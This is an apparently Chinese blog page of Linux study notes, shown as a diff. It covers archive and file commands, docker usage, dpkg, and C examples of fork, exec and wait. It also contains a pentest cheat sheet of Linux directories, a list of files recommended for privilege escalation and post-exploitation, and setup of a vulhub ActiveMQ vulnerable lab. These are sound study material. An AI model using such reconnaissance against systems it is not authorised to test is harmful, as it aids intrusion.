-<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h2 id="Linux-解压缩命令"><a href="#Linux-解压缩命令" class="headerlink" title="Linux 解压缩命令"></a><strong>Linux 解压缩命令</strong></h2><p>如何在 Linux 上解析不同的压缩包 (tar, zip, gzip, bzip2 等等) ，以及其它的一些用来在压缩包中进行搜索等操作的小技巧。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h2 id="Linux-解压缩命令"><a href="#Linux-解压缩命令" class="headerlink" title="Linux 解压缩命令"></a><strong>Linux 解压缩命令</strong></h2><p>如何在 Linux 上解析不同的压缩包 (tar, zip, gzip, bzip2 等等) ，以及其它的一些用来在压缩包中进行搜索等操作的小技巧。</p>
 <table>
 <thead>
 <tr>
@@ -1472,7 +1504,7 @@
 <td>在 Linux 上创建一个 .gz 文件。</td>
 </tr>
 </tbody></table>
-<h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h2 id="Linux-文件命令"><a href="#Linux-文件命令" class="headerlink" title="Linux 文件命令"></a><strong>Linux 文件命令</strong></h2><table>
+<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h2 id="Linux-文件命令"><a href="#Linux-文件命令" class="headerlink" title="Linux 文件命令"></a><strong>Linux 文件命令</strong></h2><table>
 <thead>
 <tr>
 <th>命令</th>
@@ -1520,7 +1552,7 @@
 <td>不显示确认提示就删除文件和目录。</td>
 </tr>
 </tbody></table>
-<h3 id="-4"><a href="#-4" class="headerlink" title></a></h3><h3 id="Misc-命令"><a href="#Misc-命令" class="headerlink" title="Misc 命令"></a>Misc 命令</h3><table>
+<h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h3 id="Misc-命令"><a href="#Misc-命令" class="headerlink" title="Misc 命令"></a>Misc 命令</h3><table>
 <thead>
 <tr>
 <th>命令</th>
@@ -1596,7 +1628,7 @@
 <td>rw——- 拥有者可以读取和写入，其他人都不能访问。</td>
 </tr>
 </tbody></table>
-<h3 id="-5"><a href="#-5" class="headerlink" title></a></h3><h3 id="Linux-文件系统的渗透测试备忘录"><a href="#Linux-文件系统的渗透测试备忘录" class="headerlink" title="Linux 文件系统的渗透测试备忘录"></a>Linux 文件系统的渗透测试备忘录</h3><table>
+<h3 id="-4"><a href="#-4" class="headerlink" title></a></h3><h3 id="Linux-文件系统的渗透测试备忘录"><a href="#Linux-文件系统的渗透测试备忘录" class="headerlink" title="Linux 文件系统的渗透测试备忘录"></a>Linux 文件系统的渗透测试备忘录</h3><table>
 <thead>
 <tr>
 <th>目录</th>
@@ -1676,7 +1708,7 @@
 <td>存储所有由用户创建的可变文件和临时文件，比如日志文件、邮件队列、后台打印程序，Web服务器，数据库等等。</td>
 </tr>
 </tbody></table>
-<h3 id="-6"><a href="#-6" class="headerlink" title></a></h3><h3 id="Linux-中有趣的文件-目录"><a href="#Linux-中有趣的文件-目录" class="headerlink" title="Linux 中有趣的文件/目录"></a>Linux 中有趣的文件/目录</h3><p>如果你想尝试进行特权升级/执行后期开发，这些都是你值得一瞧的命令。</p>
+<h3 id="-5"><a href="#-5" class="headerlink" title></a></h3><h3 id="Linux-中有趣的文件-目录"><a href="#Linux-中有趣的文件-目录" class="headerlink" title="Linux 中有趣的文件/目录"></a>Linux 中有趣的文件/目录</h3><p>如果你想尝试进行特权升级/执行后期开发，这些都是你值得一瞧的命令。</p>
 <table>
 <thead>
 <tr>
@@ -1741,9 +1773,6 @@
 <td>挂载的文件系统。</td>
 </tr>
 </tbody></table>
-<p>ps -a</p>
-<p>ps -ef</p>
-<p>kill -9 PID</p>
 <hr>
 <h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a><strong>docker常用命令</strong></h2><p>1 <strong>docker images</strong> 查看镜像信息列表 镜像是静态的</p>
 <p>2 <strong>docker ps -a</strong> 查看运行中的所有容器</p>
@@ -1762,29 +1791,49 @@
 <p>9 <strong>docker cp [YourHostFilePath] [containerID]:[DockerPath]</strong> 将宿主机内的指定文件传输至容器内部的指定地址。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">cd &#x2F;vulhub&#x2F;activemq&#x2F;CVE-2015-5254</span><br><span class="line">docker-compose up -d  #构建漏洞环境，这个命令包括了docker-compose build</span><br></pre></td></tr></table></figure>
 
-<p>5、环境关闭</p>
-<p>docker-compose down</p>
+<p>环境关闭</p>
+<p><strong>docker-compose down</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p root</span><br></pre></td></tr></table></figure>
 
-<p>dpkg -i </p>
+<h2 id="Deb包的安装"><a href="#Deb包的安装" class="headerlink" title="Deb包的安装"></a><strong>Deb包的安装</strong></h2><p>dpkg 是Debian package的简写，为”Debian“ 操作系统 专门开发的套件管理系统，用于软件的安装，更新和移除。</p>
+<p>所有源自”Debian”的Linux的发行版都使用 dpkg,  例如”Ubuntu”</p>
+<p><strong>实例:dpkg -i ~/Download/mozybackup_i386.deb</strong></p>
+<p>命令:dpkg -L package</p>
+<p><strong>安装完包后，可以用此命令查看软件安装到什么地方</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>dpkg -r  package</strong></td>
+<td><strong>移除软件，保留配置</strong></td>
+</tr>
+<tr>
+<td><strong>dpkg -P package</strong></td>
+<td><strong>移除软件，不保留配值</strong></td>
+</tr>
+</tbody></table>
 <hr>
 <h2 id="进程控制编程"><a href="#进程控制编程" class="headerlink" title="进程控制编程"></a><strong>进程控制编程</strong></h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a><strong>fork()</strong></h3><p><strong>getpid / getppid</strong> </p>
-<p><strong>getpid:</strong>得到当前进程的PID</p>
-<p><strong>getppid:</strong>得到当前进程的父进程的PID</p>
-<p>fork实例代码如下：</p>
-<p>父子进程的执行顺序—-不一定，谁抢到cpu谁执行</p>
-<p>父进程会生成 n(n+1)/2+1个子进程,N 为循环次数</p>
+<p><strong>getpid:得到当前进程的PID</strong></p>
+<p><strong>getppid:得到当前进程的父进程的PID</strong></p>
+<p><strong>fork实例代码如下：</strong></p>
+<p><strong>父子进程的执行顺序—-不一定，谁抢到cpu谁执行</strong></p>
+<p><strong>父进程会生成 n(n+1)/2+1个子进程,N 为循环次数</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"--------i = %d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork(); <span class="comment">//从此开始生成子进程，父子都会从此返回，根据返回值区分父子进程</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123; <span class="comment">//父进程返回子进程的PID</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;  <span class="comment">//子进程返回0</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行结果如下：</p>
+<p><strong>运行结果如下：</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork</span><br><span class="line">--------i = 0</span><br><span class="line">--------i = 1</span><br><span class="line">--------i = 2</span><br><span class="line">--------i = 3</span><br><span class="line">I'm parent pid = 10345, parentID = 1426</span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br><span class="line">child  pid = 10346, parentID=10345 </span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br></pre></td></tr></table></figure>
 
 
 
-<p>父进程子进程是单独执行的，但2者会共享文件</p>
+<p><strong>父进程子进程是单独执行的，但2者会共享文件</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> counter=<span class="number">200</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"first process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"second process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"third process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == n) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">400</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行结果：</p>
+<p><strong>运行结果：</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork2</span><br><span class="line">first process, pid = 10523 </span><br><span class="line">--counter = 400 </span><br><span class="line">parent process, pid = 10522 </span><br><span class="line">--counter = 600 </span><br><span class="line">second process, pid = 10524 </span><br><span class="line">--counter = 400 </span><br><span class="line">third process, pid = 10525 </span><br><span class="line">--counter = 400</span><br></pre></td></tr></table></figure>
 
 
@@ -1795,9 +1844,9 @@
 
 <h3 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a><strong>exec函数族</strong></h3><p><strong>让父子进程执行不相干的操作</strong></p>
 <p><strong>如果函数执行成功，不返回值</strong></p>
-<p>如果执行失败，打印错误信息，退出当前进程</p>
+<p><strong>如果执行失败，打印错误信息，退出当前进程</strong></p>
 <p><strong>本质是替换代码块.text中的内容，无需再创建新进程</strong></p>
-<p>execl ：执行ls -lah 的时候，就替换了后续的for循环，当ls执行结束的时候，就直接推出了，所以这里for循环仅执行1次</p>
+<p><strong>execl ：执行ls -lah 的时候，就替换了后续的for循环，当ls执行结束的时候，就直接推出了，所以这里for循环仅执行1次</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">print</span>(xxxxx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pid_t</span> pid=fork(); <span class="comment">//创建子进程</span></span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	execl(<span class="string">"/bin/ls"</span>,<span class="string">"666"</span>,<span class="string">"-lah"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"++++++ i=%d\n"</span>,i);   <span class="comment">///仅执行一次</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
@@ -1810,32 +1859,32 @@
 
 
 
-<p>孤儿进程：</p>
-<p>父进程结束，子进程还在，则子进程的父进程编程init进程</p>
-<p>目的：为了释放子进程占用的系统资源</p>
-<p>子进程释放不了pcb，必须由父进程释放</p>
+<p><strong>孤儿进程：</strong></p>
+<p><strong>父进程结束，子进程还在，则子进程的父进程编程init进程</strong></p>
+<p><strong>目的：为了释放子进程占用的系统资源</strong></p>
+<p><strong>子进程释放不了pcb，必须由父进程释放</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">         sleep(<span class="number">1</span>);</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./wait_1 </span><br><span class="line">I'm parent pid = 11675, parentID = 1426</span><br><span class="line">root@kali:~/桌面# child  pid = 11676, parentID=1</span><br></pre></td></tr></table></figure>
 
 
 
-<p>僵尸进程：</p>
-<p>子进程结束，父进程还在，但父进程不释放子进程的pcb</p>
+<p><strong>僵尸进程：</strong></p>
+<p><strong>子进程结束，父进程还在，但父进程不释放子进程的pcb</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">		&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; </span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>wait（int *status）</p>
-<p>函数作用：</p>
-<p>1.阻塞并等待子进程退出</p>
-<p>2.回收子进程残留资源</p>
-<p>3.获取子进程结束状态（退出原因）</p>
-<p>返回值：</p>
-<p>成功：清理掉的子进程ID</p>
-<p>失败：-1（没有子进程）</p>
+<p><strong>wait（int *status）</strong></p>
+<p><strong>函数作用：</strong></p>
+<p><strong>1.阻塞并等待子进程退出</strong></p>
+<p><strong>2.回收子进程残留资源</strong></p>
+<p><strong>3.获取子进程结束状态（退出原因）</strong></p>
+<p><strong>返回值：</strong></p>
+<p><strong>成功：清理掉的子进程ID</strong></p>
+<p><strong>失败：-1（没有子进程）</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">	<span class="keyword">int</span> status;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">"fork error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;		<span class="comment">//son</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I'm process child, pid = %d\n"</span>, getpid());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		execl(<span class="string">"./abnor"</span>, <span class="string">"abnor"</span>, <span class="literal">NULL</span>);</span><br><span class="line">		perror(<span class="string">"execl error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		sleep(<span class="number">1</span>);				</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">10</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//wpid = wait(NULL);	//传出参数</span></span><br><span class="line">		wpid = wait(&amp;status);	<span class="comment">//传出参数</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(WIFEXITED(status))&#123;	<span class="comment">//非0 ---正常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent, The child process "</span></span><br><span class="line">					<span class="string">"%d exit normally\n"</span>, wpid);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"return value:%d\n"</span>, WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;	<span class="comment">//非0 ----异常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"The child process exit abnormally, "</span></span><br><span class="line">					<span class="string">"killed by signal %d\n"</span>, WTERMSIG(status));</span><br><span class="line">										<span class="comment">//获取信号编号</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"other...\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="string">"test of wait abnormally\n"</span>;</span><br><span class="line"><span class="comment">//    p[0] = 'h';</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">56</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1856,30 +1905,40 @@
 
 
 
-
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">创建进程使用fork()函数，执行进程使用exec函数族，终止进程则使用exit()和_exit()函数</span><br><span class="line"></span><br><span class="line">总结了wait的5个知识点：</span><br><span class="line"></span><br><span class="line">&lt;1&gt;.僵尸进程：在一个进程调用了exit之后，该进程并非马上消失还留下一些参与的信息</span><br><span class="line"></span><br><span class="line">&lt;2&gt;.用wait结束僵尸进程.</span><br><span class="line"></span><br><span class="line"> #include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line"></span><br><span class="line">pid_t wait (int *stutas)</span><br><span class="line"></span><br><span class="line">原理：进程一旦调用了wait，就立即阻塞自己，当分析到当前进程的子进程已经exit，便会收集这个子进程的信息，然后彻底销毁，如果没有找到这样的子进程，就会一直阻塞在这里，直到有一个出现。</span><br><span class="line"></span><br><span class="line">&lt;3&gt;.参数status</span><br><span class="line"></span><br><span 